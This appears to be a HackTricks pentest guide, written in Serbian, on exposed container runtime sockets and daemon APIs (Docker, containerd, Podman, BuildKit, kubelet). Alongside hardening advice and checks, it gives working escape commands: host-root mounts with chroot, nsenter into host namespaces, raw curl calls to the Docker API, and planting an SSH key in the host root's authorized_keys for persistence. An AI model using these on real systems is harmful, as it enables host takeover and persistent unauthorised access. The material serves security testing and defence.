# Izloženost Runtime API-ja i daemona

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mnogi stvarni kompromitovani kontejneri uopšte ne počinju bekstvom iz namespace-a. Počinju pristupom kontrolnoj ravni runtime-a. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman ili kubelet preko montiranog Unix socketa ili izloženog TCP listenera, napadač može da zatraži novi kontejner sa većim privilegijama, montira host filesystem, pridruži se host namespace-ovima ili preuzme osetljive informacije o čvoru. U takvim slučajevima, runtime API je stvarna bezbednosna granica, a njegovo kompromitovanje je praktično isto što i kompromitovanje hosta.

Zato izloženost runtime socketa treba dokumentovati odvojeno od zaštita kernela. Kontejner sa uobičajenim seccomp-om, capabilities i MAC ograničenjima i dalje može biti udaljen samo jednim API pozivom od kompromitovanja hosta ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` montiran unutar njega. Izolacija kernela trenutnog kontejnera može da funkcioniše tačno kako je predviđeno, dok je upravljačka ravan runtime-a i dalje potpuno izložena.

## Modeli pristupa daemonu

Docker Engine tradicionalno izlaže svoj privilegovani API preko lokalnog Unix socketa na `unix:///var/run/docker.sock`. Istorijski je bio izložen i udaljeno preko TCP listenera kao što je `tcp://0.0.0.0:2375` ili listenera zaštićenog TLS-om na `2376`. Udaljeno izlaganje daemona bez snažnog TLS-a i autentifikacije klijenata praktično pretvara Docker API u udaljeni root interfejs.

containerd, CRI-O, Podman i kubelet izlažu slične površine visokog uticaja. Nazivi i tokovi rada se razlikuju, ali logika je ista. Ako interfejs omogućava pozivaocu da kreira workload-e, montira host putanje, preuzima kredencijale ili menja pokrenute kontejnere, onda je to privilegovani kanal za upravljanje i tako ga treba i tretirati.

Veb UI za upravljanje kontejnerima može da izloži istu bezbednosnu granicu bez direktnog pristupa lokalnog naloga socketu. Na primer, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) dokumentovao je neautentifikovano resetovanje administratorske lozinke u starijoj verziji 1.11.1. Tretirajte lokalno dostupan UI samo kao trag za dalju proveru: potvrdite instaliranu verziju i ponašanje autentifikacije, stvarnu kontrolu administratora i da li njegova upravljana krajnja tačka može da kreira kontejnere sa host bind mount-om koji omogućava pisanje. [Portainer dokumentuje](https://docs.portainer.io/admin/environments/add/docker/socket) da upravljanje preko socketa zahteva pristup Docker socketu; rootless ili ograničena krajnja tačka menja uticaj na host. Nemojte zaključivati da postoji propust u autentifikaciji ili pristup root privilegijama na hostu samo na osnovu naziva procesa, porta ili stringa verzije.

Uobičajene lokalne putanje koje vredi proveriti su:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Stariji ili specijalizovaniji stekovi mogu izlagati i krajnje tačke kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. One su ređe u savremenim okruženjima, ali ako ih pronađete, treba im pristupati jednako oprezno jer predstavljaju površine za kontrolu runtime-a, a ne obične aplikacione sokete.

## Bezbedan daljinski pristup

Ako daemon mora da bude dostupan izvan lokalnog soketa, vezu treba zaštititi TLS-om, a poželjno je koristiti i uzajamnu autentifikaciju kako bi daemon proveravao klijenta, a klijent daemon. Stara navika da se Docker daemon radi lakšeg korišćenja izloži preko običnog HTTP-a jedna je od najopasnijih grešaka u administraciji kontejnera jer je površina API-ja dovoljno moćna da direktno kreira privilegovane kontejnere.

Istorijski obrazac Docker konfiguracije izgledao je ovako:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Na hostovima zasnovanim na systemd-u, komunikacija sa demonom može da koristi i `fd://`, što znači da proces nasleđuje unapred otvoreni socket od systemd-a, umesto da ga sam direktno otvara. Važno je razumeti bezbednosne posledice, a ne tačnu sintaksu. Čim daemon počne da osluškuje izvan lokalnog socketa sa strogo ograničenim dozvolama, bezbednost transporta i autentifikacija klijenata postaju obavezni, a ne opciono dodatno očvršćavanje.

## Zloupotreba

Ako je prisutan runtime socket, utvrdite koji je to socket, da li postoji kompatibilan klijent i da li je moguć raw HTTP ili gRPC pristup:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Ove komande su korisne jer razlikuju nepostojeću putanju, montirani ali nedostupni socket i aktivni privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi kontejner sa host bind mount-om ili deljenjem host namespace-a.

### Kada klijent nije instaliran

Odsustvo alata `docker`, `podman` ili drugog jednostavnog CLI-ja ne znači da je socket bezbedan. Docker Engine komunicira preko HTTP-a putem svog Unix socket-a, a Podman izlaže i API kompatibilan sa Docker-om i Libpod-native API preko `podman system service`. To znači da i minimalno okruženje koje ima samo `curl` može biti dovoljno za upravljanje daemon-om:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Ovo je važno tokom post-exploitation faze jer branioci ponekad uklone uobičajene klijentske binarne fajlove, ali ostave montiran socket za upravljanje. Na Podman hostovima imajte na umu da se putanja velike vrednosti razlikuje kod rootful i rootless deployment-a: `unix:///run/podman/podman.sock` za rootful servisne instance i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` za rootless.

### Potpun primer: Docker socket do root pristupa hostu

Ako je `docker.sock` dostupan, klasičan način bekstva je pokretanje novog kontejnera koji montira korenski filesystem hosta, a zatim ulazak u njega pomoću `chroot`:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Ovo omogućava direktno izvršavanje kao root na hostu preko Docker daemon-a. Uticaj nije ograničen na čitanje fajlova. Kada uđe u novi container, napadač može da menja fajlove na hostu, prikuplja akreditive, uspostavi persistence ili pokrene dodatna privilegovana opterećenja.

### Pun primer: Docker Socket do Host Namespaces

Ako napadač više voli ulazak u namespace umesto pristupa samo preko filesystem-a:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Ovaj put dolazi do hosta tako što se od runtime-a traži da kreira novi container sa eksplicitnim izlaganjem host namespace-ova, umesto da se iskorišćava postojeći container.

### Docker Socket Persistence Pattern

Kontrola runtime-a može da se koristi i za održavanje perzistencije, a ne samo za jednokratni shell. Opšti obrazac je kreiranje pomoćnog container-a sa host mount-om, upisivanje materijala za autorizovani pristup ili startup hook-a u montirani host filesystem, a zatim provera da li ga host koristi.

Primer oblika:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Ista ideja može da cilja systemd jedinice, cron fragmente, datoteke za pokretanje aplikacija ili SSH ključeve, u zavisnosti od toga šta operator želi da dokaže. Važno je da se trajna izmena vrši preko ovlašćenja runtime daemon-a nad host-level sistemom datoteka, a ne pomoću dodatnih privilegija u originalnom kontejneru.

### Raw Docker API Helper Pivot

Kada Docker CLI nedostaje, isti tok sa pomoćnim kontejnerom koji koristi host mount može da se pokrene preko HTTP-a, putem Unix socketa. Opšti tok je: potvrditi API, napraviti pomoćni kontejner sa host bind mount-om, pokrenuti ga, napraviti exec instancu i pokrenuti taj exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Završni zahtev `/exec/<id>/start` zavisi od vraćenog exec ID-ja, ali bezbednosni problem ne zavisi od tačnih JSON detalja: direktan pristup API-ju rootful Docker daemon-a dovoljan je da se zatraži moćniji pomoćni workload.

### Pun primer: containerd Socket

Montirani `containerd` socket obično je jednako opasan:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Ako je dostupan klijent sličniji Docker-u, `nerdctl` može biti praktičniji od `ctr`, jer nudi poznate opcije kao što su `--privileged`, `--pid=host` i `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Uticaj je ponovo kompromitovanje hosta. Čak i ako nema alata specifičnih za Docker, drugi runtime API i dalje može da pruži iste administratorske privilegije. Na Kubernetes čvorovima, `crictl` može biti dovoljan i za izviđanje i za interakciju sa kontejnerima, jer direktno komunicira sa CRI endpointom.

### BuildKit Socket

`buildkitd` se lako previdi jer ljudi često misle da je „samo backend za build“, ali daemon je i dalje privilegovana kontrolna ravan. Dostupan `buildkitd.sock` može napadaču omogućiti da pokrene proizvoljne build korake, pregleda mogućnosti workera, koristi lokalne kontekste iz kompromitovanog okruženja i zatraži opasna ovlašćenja kao što su `network.host` ili `security.insecure`, ako je daemon konfigurisan da ih dozvoli.

Korisne početne interakcije su:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Ako daemon prihvata zahteve za build, proverite da li su dostupna nesigurna ovlašćenja:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Tačan uticaj zavisi od konfiguracije demona, ali rootful BuildKit servis sa permisivnim entitlements nije bezazlena pogodnost za programere. Tretirajte ga kao još jednu visokovrednu administrativnu površinu, naročito na CI runnerima i zajedničkim build čvorovima.

### Kubelet API preko TCP-a

Kubelet nije container runtime, ali je i dalje deo ravni za upravljanje čvorom i često se razmatra u okviru iste granice poverenja. Ako je secure port kubeleta `10250` dostupan sa workload-a ili su izloženi akreditivi čvora, kubeconfig fajlovi ili proxy prava, napadač bi mogao da izlista Pod-ove, preuzme logove ili izvršava komande u kontejnerima lokalnim za čvor, a da pritom uopšte ne prolazi kroz admission putanju Kubernetes API servera.

Počnite jednostavnim izviđanjem:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Ako kubelet ili API-server proxy putanja autorizuje `exec`, klijent koji podržava WebSocket može to da pretvori u izvršavanje koda u drugim kontejnerima na čvoru. Zato je i `nodes/proxy` sa samo dozvolom `get` opasniji nego što zvuči: zahtev i dalje može da dođe do kubelet endpoints koji izvršavaju komande, a te direktne interakcije sa kubelet-om ne pojavljuju se u uobičajenim Kubernetes audit logovima.<sup>[[2]](#references)</sup>

## Provere

Cilj ovih provera je da utvrde da li kontejner može da pristupi bilo kojoj ravni upravljanja koja je trebalo da ostane izvan granice poverenja.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Šta je ovde zanimljivo:

- Montirani runtime socket obično predstavlja direktni administrativni mehanizam, a ne puko otkrivanje informacija.
- TCP listener na portu `2375` bez TLS-a treba tretirati kao uslov za kompromitaciju na daljinu.
- Promenljive okruženja kao što je `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran da komunicira sa host runtime-om.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje zaštite |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano koristi lokalni Unix socket | `dockerd` osluškuje na lokalnom socket-u, a daemon obično radi sa root privilegijama | montiranje `/var/run/docker.sock`, izlaganje `tcp://...:2375`, slaba ili nedostajuća TLS zaštita na `2376` |
| Podman | Podrazumevano koristi CLI bez demona | Za uobičajenu lokalnu upotrebu nije potreban dugotrajni privilegovani daemon; API socket-i ipak mogu biti izloženi kada je omogućena komanda `podman system service` | izlaganje `podman.sock`, široka dostupnost servisa, rootful API upotreba |
| containerd | Lokalni privilegovani socket | Administrativni API je izložen preko lokalnog socket-a i obično ga koriste alati višeg nivoa | montiranje `containerd.sock`, širok pristup preko `ctr` ili `nerdctl`, izlaganje privilegovanih namespace-ova |
| CRI-O | Lokalni privilegovani socket | CRI endpoint je namenjen pouzdanim komponentama na istom čvoru | montiranje `crio.sock`, izlaganje CRI endpoint-a nepouzdanim workload-ovima |
| Kubernetes kubelet | Lokalni API za upravljanje čvorom | Kubelet ne bi trebalo da bude široko dostupan iz Pod-ova; pristup, u zavisnosti od authn/authz podešavanja, može da otkrije stanje pod-ova, akreditive i mogućnosti za izvršavanje | montiranje kubelet socket-a ili sertifikata, slaba kubelet autentifikacija, host networking uz dostupan kubelet endpoint |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
